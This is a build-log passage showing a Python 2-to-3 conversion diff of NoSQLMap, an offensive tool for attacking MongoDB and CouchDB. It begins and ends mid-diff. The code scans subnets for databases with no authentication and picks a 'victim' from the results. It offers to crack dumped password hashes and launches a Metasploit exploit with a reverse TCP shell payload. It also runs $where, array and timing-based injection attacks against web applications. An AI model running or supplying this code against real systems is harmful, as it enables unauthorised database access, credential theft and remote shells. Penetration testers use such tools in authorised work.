+#8 6.427 +                    crack = input("Crack this hash (y/n)? ")
+#8 6.427  
+#8 6.427                      if crack in yes_tag:
+#8 6.427                          passCrack(users[x]['user'],users[x]['pwd'])
+#8 6.427  
+#8 6.427 -    except NoSQLMapException, e:
+#8 6.427 -        print e
+#8 6.427 -        print "Error:  Couldn't list collections.  The provided credentials may not have rights."
+#8 6.524 -
+#8 6.524 -    print "\n"
+#8 6.524 +    except NoSQLMapException as e:
+#8 6.524 +        print(e)
+#8 6.524 +        print("Error:  Couldn't list collections.  The provided credentials may not have rights.")
+#8 6.524 +
+#8 6.524 +    print("\n")
+#8 6.524      return
+#8 6.524  
+#8 6.524  
+#8 6.524 @@ -342,8 +342,8 @@
+#8 6.524          proc = subprocess.call(["msfcli", "exploit/linux/misc/mongod_native_helper", "RHOST=%s" % victim, "DB=local", "PAYLOAD=linux/x86/shell/reverse_tcp", "LHOST=%s" % myIP, "LPORT=%s" % myPort, "E"])
+#8 6.524  
+#8 6.524      except NoSQLMapException:
+#8 6.524 -        print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."
+#8 6.524 -    raw_input("Press enter to continue...")
+#8 6.524 +        print("Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined.")
+#8 6.524 +    input("Press enter to continue...")
+#8 6.524      return
+#8 6.524  
+#8 6.524  
+#8 6.524 @@ -354,15 +354,15 @@
+#8 6.524                  db = mongoConn[dbItem]
+#8 6.524                  fs = gridfs.GridFS(db)
+#8 6.524                  files = fs.list()
+#8 6.524 -                print "GridFS enabled on database " + str(dbItem)
+#8 6.524 -                print " list of files:"
+#8 6.524 -                print "\n".join(files)
+#8 6.524 +                print("GridFS enabled on database " + str(dbItem))
+#8 6.524 +                print(" list of files:")
+#8 6.524 +                print("\n".join(files))
+#8 6.524  
+#8 6.524              except NoSQLMapException:
+#8 6.524 -                print "GridFS not enabled on " + str(dbItem) + "."
+#8 6.524 +                print("GridFS not enabled on " + str(dbItem) + ".")
+#8 6.524  
+#8 6.524      except NoSQLMapException:
+#8 6.524 -        print "Error:  Couldn't enumerate GridFS.  The provided credentials may not have rights."
+#8 6.524 +        print("Error:  Couldn't enumerate GridFS.  The provided credentials may not have rights.")
+#8 6.524  
+#8 6.524      return
+#8 6.524  
+#8 6.524 @@ -406,7 +406,7 @@
+#8 6.524                  conn.close()
+#8 6.524                  return [0,dbVer]
+#8 6.524  
+#8 6.524 -            except NoSQLMapException, e:
+#8 6.524 +            except NoSQLMapException as e:
+#8 6.524                  if str(e).find('need to login') != -1:
+#8 6.524                      conn.close()
+#8 6.524                      return [1,None]
+#8 6.524 --- /opt/NoSQLMap/nsmscan.py	(original)
+#8 6.524 +++ /opt/NoSQLMap/nsmscan.py	(refactored)
+#8 6.524 @@ -24,31 +24,31 @@
+#8 6.524      ipList = []
+#8 6.524      resultSet = []
+#8 6.524  
+#8 6.524 -    print "\n"
+#8 6.524 -    print platform + " Default Access Scanner"
+#8 6.524 -    print "=============================="
+#8 6.524 -    print "1-Scan a subnet for default " + platform + " access"
+#8 6.524 -    print "2-Loads IPs to scan from a file"
+#8 6.524 -    print "3-Enable/disable host pings before attempting connection"
+#8 6.524 -    print "x-Return to main menu"
+#8 6.524 +    print("\n")
+#8 6.524 +    print(platform + " Default Access Scanner")
+#8 6.524 +    print("==============================")
+#8 6.524 +    print("1-Scan a subnet for default " + platform + " access")
+#8 6.524 +    print("2-Loads IPs to scan from a file")
+#8 6.524 +    print("3-Enable/disable host pings before attempting connection")
+#8 6.524 +    print("x-Return to main menu")
+#8 6.524  
+#8 6.524      while optCheck:
+#8 6.524 -        loadOpt = raw_input("Select an option: ")
+#8 6.524 +        loadOpt = input("Select an option: ")
+#8 6.524  
+#8 6.524          if loadOpt == "1":
+#8 6.524 -            subnet = raw_input("Enter subnet to scan: ")
+#8 6.524 +            subnet = input("Enter subnet to scan: ")
+#8 6.524  
+#8 6.524              try:
+#8 6.524                  for ip in ipcalc.Network(subnet):
+#8 6.524                      ipList.append(str(ip))
+#8 6.524                  optCheck = False
+#8 6.524              except NoSQLMapException:
+#8 6.524 -                raw_input("Not a valid subnet.  Press enter to return to main menu.")
+#8 6.524 +                input("Not a valid subnet.  Press enter to return to main menu.")
+#8 6.524                  return
+#8 6.524  
+#8 6.524          if loadOpt == "2":
+#8 6.524              while loadCheck == False:
+#8 6.524 -                loadPath = raw_input("Enter file name with IP list to scan: ")
+#8 6.524 +                loadPath = input("Enter file name with IP list to scan: ")
+#8 6.524  
+#8 6.524                  try:
+#8 6.524                      with open (loadPath) as f:
+#8 6.524 @@ -56,22 +56,22 @@
+#8 6.524                      loadCheck = True
+#8 6.524                      optCheck = False
+#8 6.524                  except NoSQLMapException:
+#8 6.524 -                    print "Couldn't open file."
+#8 6.524 +                    print("Couldn't open file.")
+#8 6.524  
+#8 6.524          if loadOpt == "3":
+#8 6.524              if ping == False:
+#8 6.524                  ping = True
+#8 6.524 -                print "Scan will ping host before connection attempt."
+#8 6.524 +                print("Scan will ping host before connection attempt.")
+#8 6.524  
+#8 6.524              elif ping == True:
+#8 6.524                  ping = False
+#8 6.524 -                print "Scan will not ping host before connection attempt."
+#8 6.524 +                print("Scan will not ping host before connection attempt.")
+#8 6.524  
+#8 6.524          if loadOpt == "x":
+#8 6.524              return
+#8 6.524  
+#8 6.524  
+#8 6.524 -    print "\n"
+#8 6.524 +    print("\n")
+#8 6.524      for target in ipList:
+#8 6.524  
+#8 6.524          if platform == "MongoDB":
+#8 6.524 @@ -81,32 +81,32 @@
+#8 6.524              result = nsmcouch.couchScan(target.rstrip(),5984,ping)
+#8 6.524  
+#8 6.524          if result[0] == 0:
+#8 6.524 -            print "Successful default access on " + target.rstrip() + "(" + platform + " Version: " + result[1] + ")."
+#8 6.524 +            print("Successful default access on " + target.rstrip() + "(" + platform + " Version: " + result[1] + ").")
+#8 6.524              success.append(target.rstrip())
+#8 6.524              versions.append(result[1])
+#8 6.524  
+#8 6.524          elif result[0] == 1:
+#8 6.524 -            print platform + " running but credentials required on " + target.rstrip() + "."
+#8 6.524 +            print(platform + " running but credentials required on " + target.rstrip() + ".")
+#8 6.524              creds.append(target.rstrip()) # Future use
+#8 6.524  
+#8 6.524          elif result[0] == 2:
+#8 6.524 -            print "Successful " + platform + " connection to " + target.rstrip() + " but error executing command."
+#8 6.524 +            print("Successful " + platform + " connection to " + target.rstrip() + " but error executing command.")
+#8 6.524              commError.append(target.rstrip()) # Future use
+#8 6.524  
+#8 6.524          elif result[0] == 3:
+#8 6.524 -            print "Couldn't connect to " + target.rstrip() + "."
+#8 6.524 +            print("Couldn't connect to " + target.rstrip() + ".")
+#8 6.524  
+#8 6.524          elif result[0] == 4:
+#8 6.524 -            print target.rstrip() + " didn't respond to ping."
+#8 6.524 +            print(target.rstrip() + " didn't respond to ping.")
+#8 6.524  
+#8 6.524  
+#8 6.524 -    print "\n\n"
+#8 6.524 +    print("\n\n")
+#8 6.524      select = True
+#8 6.524      while select:
+#8 6.524 -        saveEm = raw_input("Save scan results to CSV? (y/n):")
+#8 6.524 +        saveEm = input("Save scan results to CSV? (y/n):")
+#8 6.524  
+#8 6.524          if saveEm in yes_tag:
+#8 6.524 -            savePath = raw_input("Enter file name to save: ")
+#8 6.524 +            savePath = input("Enter file name to save: ")
+#8 6.524              outCounter = 0
+#8 6.524              try:
+#8 6.524                  fo = open(savePath, "wb")
+#8 6.524 @@ -117,11 +117,11 @@
+#8 6.524                      outCounter += 1
+#8 6.524  
+#8 6.524                  fo.close()
+#8 6.524 -                print "Scan results saved!"
+#8 6.524 +                print("Scan results saved!")
+#8 6.524                  select = False
+#8 6.524  
+#8 6.524              except NoSQLMapException:
+#8 6.524 -                print "Couldn't save scan results."
+#8 6.524 +                print("Couldn't save scan results.")
+#8 6.524  
+#8 6.524          elif saveEm in no_tag:
+#8 6.524              select = False
+#8 6.524 @@ -129,19 +129,19 @@
+#8 6.524          else:
+#8 6.524              select = True
+#8 6.524  
+#8 6.524 -    print "Discovered " + platform + " Servers with No Auth:"
+#8 6.524 -    print "IP" + " " + "Version"
+#8 6.524 +    print("Discovered " + platform + " Servers with No Auth:")
+#8 6.524 +    print("IP" + " " + "Version")
+#8 6.524  
+#8 6.524      outCounter= 1
+#8 6.524  
+#8 6.524      for server in success:
+#8 6.524 -        print str(outCounter) + "-" + server + " " + versions[outCounter - 1]
+#8 6.524 +        print(str(outCounter) + "-" + server + " " + versions[outCounter - 1])
+#8 6.524          outCounter += 1
+#8 6.524  
+#8 6.524      select = True
+#8 6.524 -    print "\n"
+#8 6.524 +    print("\n")
+#8 6.524      while select:
+#8 6.524 -        select = raw_input("Select a NoSQLMap target or press x to exit: ")
+#8 6.524 +        select = input("Select a NoSQLMap target or press x to exit: ")
+#8 6.524  
+#8 6.524          if select == "x" or select == "X":
+#8 6.524              return None
+#8 6.524 @@ -150,8 +150,8 @@
+#8 6.524              victim = success[int(select) - 1]
+#8 6.524              resultSet[0] = True
+#8 6.524              resultSet[1] = victim
+#8 6.524 -            raw_input("New target set! Press enter to return to the main menu.")
+#8 6.524 +            input("New target set! Press enter to return to the main menu.")
+#8 6.524              return resultSet
+#8 6.524  
+#8 6.524          else:
+#8 6.524 -            raw_input("Invalid selection.")
+#8 6.524 +            input("Invalid selection.")
+#8 6.524 --- /opt/NoSQLMap/nsmweb.py	(original)
+#8 6.524 +++ /opt/NoSQLMap/nsmweb.py	(refactored)
+#8 6.524 @@ -4,8 +4,8 @@
+#8 6.524  
+#8 6.524  
+#8 6.524  from exception import NoSQLMapException
+#8 6.524 -import urllib
+#8 6.524 -import urllib2
+#8 6.524 +import urllib.request, urllib.parse, urllib.error
+#8 6.524 +import urllib.request, urllib.error, urllib.parse
+#8 6.524  import string
+#8 6.524  import nsmmongo
+#8 6.524  from sys import version_info
+#8 6.524 @@ -53,8 +53,8 @@
+#8 6.524              ["--savePath", "output file name"]]
+#8 6.524  
+#8 6.524  def getApps(webPort,victim,uri,https,verb,requestHeaders, args = None):
+#8 6.524 -    print "Web App Attacks (GET)"
+#8 6.524 -    print "==============="
+#8 6.524 +    print("Web App Attacks (GET)")
+#8 6.524 +    print("===============")
+#8 6.524      paramName = []
+#8 6.524      global testNum
+#8 6.524      global httpMethod
+#8 6.524 @@ -80,7 +80,7 @@
+#8 6.524      int24 = False
+#8 6.524  
+#8 6.524      # Verify app is working.
+#8 6.524 -    print "Checking to see if site at " + str(victim).strip() + ":" + str(webPort).strip() + str(uri).strip() + " is up..."
+#8 6.524 +    print("Checking to see if site at " + str(victim).strip() + ":" + str(webPort).strip() + str(uri).strip() + " is up...")
+#8 6.524  
+#8 6.524      if https == "OFF":
+#8 6.524          appURL = "http://" + str(victim).strip() + ":" + str(webPort).strip() + str(uri).strip()
+#8 6.524 @@ -88,11 +88,11 @@
+#8 6.524      elif https == "ON":
+#8 6.524          appURL = "https://" + str(victim).strip() + ":" + str(webPort).strip() + str(uri).strip()
+#8 6.524      try:
+#8 6.524 -        req = urllib2.Request(appURL, None, requestHeaders)
+#8 6.524 -        appRespCode = urllib2.urlopen(req).getcode()
+#8 6.524 +        req = urllib.request.Request(appURL, None, requestHeaders)
+#8 6.524 +        appRespCode = urllib.request.urlopen(req).getcode()
+#8 6.524          if appRespCode == 200:
+#8 6.524              normLength = int(len(getResponseBodyHandlingErrors(req)))
+#8 6.524 -            timeReq = urllib2.urlopen(req)
+#8 6.524 +            timeReq = urllib.request.urlopen(req)
+#8 6.524              start = time.time()
+#8 6.524              page = timeReq.read()
+#8 6.524              end = time.time()
+#8 6.524 @@ -100,16 +100,16 @@
+#8 6.524              timeBase = round((end - start), 3)
+#8 6.524  
+#8 6.524              if verb == "ON":
+#8 6.524 -                print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"
+#8 6.524 -            else:
+#8 6.524 -                print "App is up!"
+#8 6.524 +                print("App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n")
+#8 6.524 +            else:
+#8 6.524 +                print("App is up!")
+#8 6.524              appUp = True
+#8 6.524  
+#8 6.524          else:
+#8 6.524 -            print "Got " + str(appRespCode) + "from the app, check your options."
+#8 6.524 -    except NoSQLMapException,e:
+#8 6.524 -        print e
+#8 6.524 -        print "Looks like the server didn't respond.  Check your options."
+#8 6.524 +            print("Got " + str(appRespCode) + "from the app, check your options.")
+#8 6.524 +    except NoSQLMapException as e:
+#8 6.524 +        print(e)
+#8 6.524 +        print("Looks like the server didn't respond.  Check your options.")
+#8 6.524  
+#8 6.524      if appUp == True:
+#8 6.524  
+#8 6.524 @@ -117,10 +117,10 @@
+#8 6.524              sizeSelect = True 
+#8 6.524  
+#8 6.524              while sizeSelect:
+#8 6.524 -                injectSize = raw_input("Baseline test-Enter random string size: ")
+#8 6.524 +                injectSize = input("Baseline test-Enter random string size: ")
+#8 6.524                  sizeSelect = not injectSize.isdigit() 
+#8 6.524                  if sizeSelect:
+#8 6.524 -                    print "Invalid! The size should be an integer."
+#8 6.524 +                    print("Invalid! The size should be an integer.")
+#8 6.524  
+#8 6.524              format = randInjString(int(injectSize))
+#8 6.524          else:
+#8 6.524 @@ -130,42 +130,42 @@
+#8 6.524          injectSize = int(injectSize)
+#8 6.524          injectString = build_random_string(format, injectSize)
+#8 6.524  
+#8 6.524 -        print "Using " + injectString + " for injection testing.\n"
+#8 6.524 +        print("Using " + injectString + " for injection testing.\n")
+#8 6.524  
+#8 6.524          # Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
+#8 6.524          if "?" not in appURL:
+#8 6.524 -            print "No URI parameters provided for GET request...Check your options.\n"
+#8 6.524 +            print("No URI parameters provided for GET request...Check your options.\n")
+#8 6.524              if args == None:
+#8 6.524 -                raw_input("Press enter to continue...")
+#8 6.524 +                input("Press enter to continue...")
+#8 6.524              return()
+#8 6.524  
+#8 6.524          randomUri = buildUri(appURL,injectString, args)
+#8 6.524 -        print "URI : " + randomUri
+#8 6.524 -        req = urllib2.Request(randomUri, None, requestHeaders)
+#8 6.524 -
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Checking random injected parameter HTTP response size using " + randomUri +"...\n"
+#8 6.524 -        else:
+#8 6.524 -            print "Sending random parameter value..."
+#8 6.524 +        print("URI : " + randomUri)
+#8 6.524 +        req = urllib.request.Request(randomUri, None, requestHeaders)
+#8 6.524 +
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Checking random injected parameter HTTP response size using " + randomUri +"...\n")
+#8 6.524 +        else:
+#8 6.524 +            print("Sending random parameter value...")
+#8 6.524  
+#8 6.524          responseBody = getResponseBodyHandlingErrors(req)
+#8 6.524          randLength = int(len(responseBody))
+#8 6.524  
+#8 6.524 -        print "Got response length of " + str(randLength) + "."
+#8 6.524 +        print("Got response length of " + str(randLength) + ".")
+#8 6.524          randNormDelta = abs(normLength - randLength)
+#8 6.524  
+#8 6.524          if randNormDelta == 0:
+#8 6.524 -            print "No change in response size injecting a random parameter..\n"
+#8 6.524 -        else:
+#8 6.524 -            print "Random value variance: " + str(randNormDelta) + "\n"
+#8 6.524 -
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Testing Mongo PHP not equals associative array injection using " + uriArray[1] +"..."
+#8 6.524 -        else:
+#8 6.524 -            print "Test 1: PHP/ExpressJS != associative array injection"
+#8 6.524 +            print("No change in response size injecting a random parameter..\n")
+#8 6.524 +        else:
+#8 6.524 +            print("Random value variance: " + str(randNormDelta) + "\n")
+#8 6.524 +
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Testing Mongo PHP not equals associative array injection using " + uriArray[1] +"...")
+#8 6.524 +        else:
+#8 6.524 +            print("Test 1: PHP/ExpressJS != associative array injection")
+#8 6.524  
+#8 6.524          # Test for errors returned by injection
+#8 6.524 -        req = urllib2.Request(uriArray[1], None, requestHeaders)
+#8 6.524 +        req = urllib.request.Request(uriArray[1], None, requestHeaders)
+#8 6.524          errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+#8 6.524  
+#8 6.524          if errorCheck == False:
+#8 6.524 @@ -175,15 +175,15 @@
+#8 6.524          else:
+#8 6.524              testNum += 1
+#8 6.524  
+#8 6.524 -        print "\n"
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
+#8 6.524 -            print "Injecting " + uriArray[2]
+#8 6.524 -        else:
+#8 6.524 -            print "Test 2: $where injection (string escape)"
+#8 6.524 -
+#8 6.524 -        print uriArray[2]
+#8 6.524 -        req = urllib2.Request(uriArray[2], None, requestHeaders)
+#8 6.524 +        print("\n")
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n")
+#8 6.524 +            print("Injecting " + uriArray[2])
+#8 6.524 +        else:
+#8 6.524 +            print("Test 2: $where injection (string escape)")
+#8 6.524 +
+#8 6.524 +        print(uriArray[2])
+#8 6.524 +        req = urllib.request.Request(uriArray[2], None, requestHeaders)
+#8 6.524          errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+#8 6.524  
+#8 6.524  
+#8 6.524 @@ -195,14 +195,14 @@
+#8 6.524          else:
+#8 6.524              testNum += 1
+#8 6.524  
+#8 6.524 -        print "\n"
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
+#8 6.524 -            print "Injecting " + uriArray[3]
+#8 6.524 -        else:
+#8 6.524 -            print "Test 3:  $where injection (integer escape)"
+#8 6.524 -
+#8 6.524 -        req = urllib2.Request(uriArray[3], None, requestHeaders)
+#8 6.524 +        print("\n")
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n")
+#8 6.524 +            print("Injecting " + uriArray[3])
+#8 6.524 +        else:
+#8 6.524 +            print("Test 3:  $where injection (integer escape)")
+#8 6.524 +
+#8 6.524 +        req = urllib.request.Request(uriArray[3], None, requestHeaders)
+#8 6.524          errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+#8 6.524  
+#8 6.524  
+#8 6.524 @@ -215,14 +215,14 @@
+#8 6.524              testNum +=1
+#8 6.524  
+#8 6.524          # Start a single record attack in case the app expects only one record back
+#8 6.524 -        print "\n"
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
+#8 6.524 -            print " Injecting " + uriArray[4]
+#8 6.524 -        else:
+#8 6.524 -            print "Test 4: $where injection string escape (single record)"
+#8 6.524 -
+#8 6.524 -        req = urllib2.Request(uriArray[4], None, requestHeaders)
+#8 6.524 +        print("\n")
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n")
+#8 6.524 +            print(" Injecting " + uriArray[4])
+#8 6.524 +        else:
+#8 6.524 +            print("Test 4: $where injection string escape (single record)")
+#8 6.524 +
+#8 6.524 +        req = urllib.request.Request(uriArray[4], None, requestHeaders)
+#8 6.524          errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+#8 6.524  
+#8 6.524          if errorCheck == False:
+#8 6.524 @@ -232,14 +232,14 @@
+#8 6.524          else:
+#8 6.524              testNum += 1
+#8 6.524  
+#8 6.524 -        print "\n"
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
+#8 6.524 -            print " Injecting " + uriArray[5]
+#8 6.524 -        else:
+#8 6.524 -            print "Test 5: $where injection integer escape (single record)"
+#8 6.524 -
+#8 6.524 -        req = urllib2.Request(uriArray[5], None, requestHeaders)
+#8 6.524 +        print("\n")
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n")
+#8 6.524 +            print(" Injecting " + uriArray[5])
+#8 6.524 +        else:
+#8 6.524 +            print("Test 5: $where injection integer escape (single record)")
+#8 6.524 +
+#8 6.524 +        req = urllib.request.Request(uriArray[5], None, requestHeaders)
+#8 6.524          errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+#8 6.524  
+#8 6.524          if errorCheck == False:
+#8 6.524 @@ -250,14 +250,14 @@
+#8 6.524          else:
+#8 6.524              testNum += 1
+#8 6.524  
+#8 6.524 -        print "\n"
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Testing Mongo this not equals string escape attack for all records..."
+#8 6.524 -            print " Injecting " + uriArray[6]
+#8 6.524 -        else:
+#8 6.524 -            print "Test 6: This != injection (string escape)"
+#8 6.524 -
+#8 6.524 -        req = urllib2.Request(uriArray[6], None, requestHeaders)
+#8 6.524 +        print("\n")
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Testing Mongo this not equals string escape attack for all records...")
+#8 6.524 +            print(" Injecting " + uriArray[6])
+#8 6.524 +        else:
+#8 6.524 +            print("Test 6: This != injection (string escape)")
+#8 6.524 +
+#8 6.524 +        req = urllib.request.Request(uriArray[6], None, requestHeaders)
+#8 6.524          errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+#8 6.524  
+#8 6.524          if errorCheck == False:
+#8 6.524 @@ -267,14 +267,14 @@
+#8 6.524          else:
+#8 6.524              testNum += 1
+#8 6.524  
+#8 6.524 -        print "\n"
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Testing Mongo this not equals integer escape attack for all records..."
+#8 6.524 -            print " Injecting " + uriArray[7]
+#8 6.524 -        else:
+#8 6.524 -            print "Test 7: This != injection (integer escape)"
+#8 6.524 -
+#8 6.524 -        req = urllib2.Request(uriArray[7], None, requestHeaders)
+#8 6.524 +        print("\n")
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Testing Mongo this not equals integer escape attack for all records...")
+#8 6.524 +            print(" Injecting " + uriArray[7])
+#8 6.524 +        else:
+#8 6.524 +            print("Test 7: This != injection (integer escape)")
+#8 6.524 +
+#8 6.524 +        req = urllib.request.Request(uriArray[7], None, requestHeaders)
+#8 6.524          errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+#8 6.524  
+#8 6.524          if errorCheck == False:
+#8 6.524 @@ -283,16 +283,16 @@
+#8 6.524              testNum += 1
+#8 6.524          else:
+#8 6.524              testNum += 1
+#8 6.524 -        print "\n"
+#8 6.524 -
+#8 6.524 -        if verb == "ON":
+#8 6.524 -            print "Testing  PHP/ExpressJS > undefined attack for all records..."
+#8 6.524 -            print "Injecting " + uriArray[8]
+#8 6.524 -
+#8 6.524 -        else:
+#8 6.524 -            print "Test 8: PHP/ExpressJS > Undefined Injection"
+#8 6.524 -
+#8 6.524 -        req = urllib2.Request(uriArray[8], None, requestHeaders)
+#8 6.524 +        print("\n")
+#8 6.524 +
+#8 6.524 +        if verb == "ON":
+#8 6.524 +            print("Testing  PHP/ExpressJS > undefined attack for all records...")
+#8 6.524 +            print("Injecting " + uriArray[8])
+#8 6.524 +
+#8 6.524 +        else:
+#8 6.524 +            print("Test 8: PHP/ExpressJS > Undefined Injection")
+#8 6.524 +
+#8 6.524 +        req = urllib.request.Request(uriArray[8], None, requestHeaders)
+#8 6.524          errorCheck = errorTest(getResponseBodyHandlingErrors(req),testNum)
+#8 6.524  
+#8 6.524          if errorCheck == False:
+#8 6.524 @@ -301,13 +301,13 @@
+#8 6.524              testNum += 1
+#8 6.524  
+#8 6.524          if args == None:
+#8 6.524 -            doTimeAttack = raw_input("Start timing based tests (y/n)? ")
+#8 6.524 +            doTimeAttack = input("Start timing based tests (y/n)? ")
+#8 6.524          else:
+#8 6.524              doTimeAttack = args.doTimeAttack
+#8 6.524  
+#8 6.524          if doTimeAttack.lower() == "y":
+#8 6.524 -            print "Starting Javascript string escape time based injection..."
+#8 6.524 -            req = urllib2.Request(uriArray[18], None, requestHeaders)
+#8 6.524 +            print("Starting Javascript string escape time based injection...")
+#8 6.524 +            req = urllib.request.Request(uriArray[18], None, requestHeaders)
+#8 6.524              start = time.time()
+#8 6.524              page = getResponseBodyHandlingErrors(req)
+#8 6.524              end = time.time()
+#8 6.524 @@ -316,15 +316,15 @@
+#8 6.524              strTimeDelta = (int(round((end - start), 3)) - timeBase)
+#8 6.524              #print str(strTimeDelta)
+#8 6.524              if strTimeDelta > 25:
+#8 6.524 -                print "HTTP load time variance was " + str(strTimeDelta) +" seconds! Injection possible."
+#8 6.524 +                print("HTTP load time variance was " + str(strTimeDelta) +" seconds! Injection possible.")
+#8 6.524                  strTbAttack = True
+#8 6.524  
+#8 6.524              else:
+#8 6.524 -                print "HTTP load time variance was only " + str(strTimeDelta) + " seconds.  Injection probably didn't work."
+#8 6.524 +                print("HTTP load time variance was only " + str(strTimeDelta) + " seconds.  Injection probably didn't work.")
+#8 6.524                  strTbAttack = False
+#8 6.524  
+#8 6.524 -            print "Starting Javascript integer escape time based injection..."
+#8 6.524 -            req = urllib2.Request(uriArray[9], None, requestHeaders)
+#8 6.524 +            print("Starting Javascript integer escape time based injection...")
+#8 6.524 +            req = urllib.request.Request(uriArray[9], None, requestHeaders)
+#8 6.524              start = time.time()
+#8 6.524              page = getResponseBodyHandlingErrors(req)
+#8 6.524              end = time.time()
+#8 6.524 @@ -333,67 +333,67 @@
+#8 6.524              intTimeDelta = (int(round((end - start), 3)) - timeBase)
+#8 6.524              #print str(strTimeDelta)
+#8 6.524              if intTimeDelta > 25:
+#8 6.524 -                print "HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible."
+#8 6.524 +                print("HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible.")
+#8 6.524                  intTbAttack = True
+#8 6.524  
+#8 6.524              else:
+#8 6.524 -                print "HTTP load time variance was only " + str(intTimeDelta) + " seconds.  Injection probably didn't work."
+#8 6.524 +                print("HTTP load time variance was only " + str(intTimeDelta) + " seconds.  Injection probably didn't work.")
+#8 6.524                  intTbAttack = False
+#8 6.524  
+#8 6.524          if lt24 == True:
+#8 6.524 -            bfInfo = raw_input("MongoDB < 2.4 detected.  Start brute forcing database info (y/n)? ")
+#8 6.524 +            bfInfo = input("MongoDB < 2.4 detected.  Start brute forcing database info (y/n)? ")
+#8 6.524  
+#8 6.524              if bfInfo.lower == "y":
+#8 6.524                  getDBInfo()
+#8 6.524  
+#8 6.524  
+#8 6.524 -        print "\n"
+#8 6.524 -        print "Vulnerable URLs:"
+#8 6.524 -        print "\n".join(vulnAddrs)
+#8 6.524 -        print "\n"
+#8 6.524 -        print "Possibly vulnerable URLs:"
+#8 6.524 -        print"\n".join(possAddrs)
+#8 6.524 -        print "\n"
+#8 6.524 -        print "Timing based attacks:"
+#8 6.524 +        print("\n")
+#8 6.524 +        print("Vulnerable URLs:")
+#8 6.524 +        print("\n".join(vulnAddrs))
+#8 6.524 +        print("\n")
+#8 6.524 +        print("Possibly vulnerable URLs:")
+#8 6.524 +        print("\n".join(possAddrs))
+#8 6.524 +        print("\n")
+#8 6.524 +        print("Timing based attacks:")
+#8 6.524  
+#8 6.524          if strTbAttack == True:
+#8 6.524 -            print "String attack-Successful"
+#8 6.524 -        else:
+#8 6.524 -            print "String attack-Unsuccessful"
+#8 6.524 +            print("String attack-Successful")
+#8 6.524 +        else:
+#8 6.524 +            print("String attack-Unsuccessful")
+#8 6.524          if intTbAttack == True:
+#8 6.524 -            print "Integer attack-Successful"
+#8 6.524 -        else:
+#8 6.524 -            print "Integer attack-Unsuccessful"
+#8 6.524 +            print("Integer attack-Successful")
+#8 6.524 +        else:
+#8 6.524 +            print("Integer attack-Unsuccessful")
+#8 6.524  
+#8 6.524          if args == None:
+#8 6.524 -            fileOut = raw_input("Save results to file (y/n)? ")
+#8 6.524 +            fileOut = input("Save results to file (y/n)? ")
+#8 6.524          else:
+#8 6.524              fileOut = "y" if args.savePath else "n"
+#8 6.524  
+#8 6.524          if fileOut.lower() == "y":
+#8 6.524              if args == None:
+#8 6.524 -                savePath = raw_input("Enter output file name: ")
+#8 6.524 +                savePath = input("Enter output file name: ")
+#8 6.524              else:
+#8 6.524                  savePath = args.savePath
+#8 6.524              save_to(savePath, vulnAddrs, possAddrs, strTbAttack,intTbAttack)
+#8 6.524  
+#8 6.524      if args == None:
+#8 6.524 -        raw_input("Press enter to continue...")
+#8 6.524 +        input("Press enter to continue...")
+#8 6.524      return()
+#8 6.524  
+#8 6.524  
+#8 6.524  def getResponseBodyHandlingErrors(req):
+#8 6.524      try:
+#8 6.524 -        responseBody = urllib2.urlopen(req).read()
+#8 6.524 -    except urllib2.HTTPError, err:
+#8 6.524 +        responseBody = urllib.request.urlopen(req).read()
+#8 6.524 +    except urllib.error.HTTPError as err:
+#8 6.524          responseBody = err.read()
+#8 6.524      
+#8 6.524      return responseBody
+#8 6.524  
+#8 6.524  
+#8 6.524  def postApps(victim,webPort,uri,https,verb,postData,requestHeaders, args = None):
+#8 6.524 -    print "Web App Attacks (POST)"
+#8 6.524 -    print "==============="
+#8 6.524 +    print("Web App Attacks (POST)")
+#8 6.524 +    print("===============")
+#8 6.524      paramName = []
+#8 6.524      paramValue = []
+#8 6.524      global vulnAddrs
+#8 6.524 @@ -414,7 +414,7 @@
+#8 6.524      testNum = 1
+#8 6.524  
+#8 6.524      # Verify app is working.
+#8 6.524 -    print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
+#8 6.524 +    print("Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up...")
+#8 6.524  
+#8 6.524      if https == "OFF":
+#8 6.524          appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
+#8 6.524 @@ -423,14 +423,14 @@
